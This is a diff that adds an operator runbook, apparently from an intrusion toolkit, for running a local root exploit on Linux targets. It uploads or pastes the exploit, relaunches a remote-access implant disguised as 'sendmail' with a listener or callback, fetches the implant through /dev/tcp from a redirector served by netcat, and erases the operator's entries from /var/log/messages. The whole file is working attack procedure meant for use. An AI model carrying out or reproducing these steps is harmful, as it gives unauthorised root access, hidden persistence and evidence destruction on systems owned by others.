@@ -1,0 +1,101 @@
+#
+# upload & run the one without comments
+#
+# Usage: ./nameuploadedas
+
+######################### ON WITH NOPEN? IF NOT SKIP TO
+######################### SECOND HALF BELOW.
+
+## UPLOAD IT AS sh (No need for -cd if already in a good spot)
+-cd /tmp
+-ls sh
+-put /current/up/procsuids.sh.WITHOUTCOMMENTS sh
+
+## RUN IT IN A -shell NOTE:  it is the EUID that changes not UID,
+## so you are looking for: euid=0(root)
+-shell
+id
+./sh
+id
+rm sh
+
+
+
+## FOLLOWING ASSUME NOPEN IS UPLOADED AS sendmail AND IN ./
+
+## NOW IN SAME -shell as newly acquired root user, re-run NOPEN
+PATH=. sendmail
+
+## OR USE SOME PORT
+PATH=. D=-lPORT sendmail
+
+## OR A CALLBACK
+PATH=. D=-cIPADDR:PORT sendmail
+
+
+## RECONNECT TO NEW NOPEN SERVER AS ROOT
+
+
+
+## IF THAT WORKS exit your -shell and -burn that NOPEN (the non-root one)
+exit
+exit
+id
+-burn
+
+
+## CLEAN LOGS WITH THE root NOPEN
+-logs
+date
+-tail /var/log/messages
+-tail /var/log/kern.messages
+-grep "failure.*NONROOTUSER" /var/log/messages
+
+## IF noclient 3.0.3.2 or better this works best
+## Assuming that was all us
+-logclean "failure.*NONROOTUSER" /var/log/messages
+
+
+
+######################### NOT ON WITH NOPEN? (REPEAT, NOT ON WITH NOPEN)
+######################### SECOND HALF BELOW RUNS EXPLOIT IN REGULAR SHELL
+
+## IN YOUR NON-ROOT SHELL YOU SHOULD BE SOMEPLACE YOU WANT TO CREATE A FILE
+ls -al /tmp/.scsi
+mkdir /tmp/.scsi
+cd /tmp/.scsi
+
+## IN THE NON-ROOT SHELL TYPE
+ls -al sh
+
+## NOT THERE, RIGHT? GOOD, THEN CONTINUE
+
+## IN A LOCAL WINDOW, RUN:
+echo "cat <<EOF > sh" ; cat /current/up/procsuids.sh.WITHOUTCOMMENTS ; echo EOF
+
+
+## PASTE THAT OUTPUT, FROM THE cat TO THE LAST EOF INTO TARGET
+## NON-ROOT SHELL WINDOW.
+
+## CHECK THAT IT IS THERE and CHMOD IT
+ls -al sh ; chmod 700 sh ; ls -al sh
+
+## IF YOU GET ROOT YOU'RE GOOD
+## NOTE: you are looking for: euid=0(root), not your uid
+id
+./sh
+id
+
+## GET NOPEN UP AND RUN IT AS ROOT (uudecode/paste is another option
+## that requires no callback)
+
+## LOCALLY START LISTENER ON BINARY noserver
+nc -l -p RANDPORT < /current/up/morerats/noserver-3.0.3.1-i586.pc.linux
+
+## REDIRECTING? YOU'LL NEED THIS
+-nrtun RANDPORT
+
+## THEN IN ROOT REMOTE SHELL WINDOW
+cat < /dev/tcp/REDIRIP/RANDPORT > sendmail
+
+
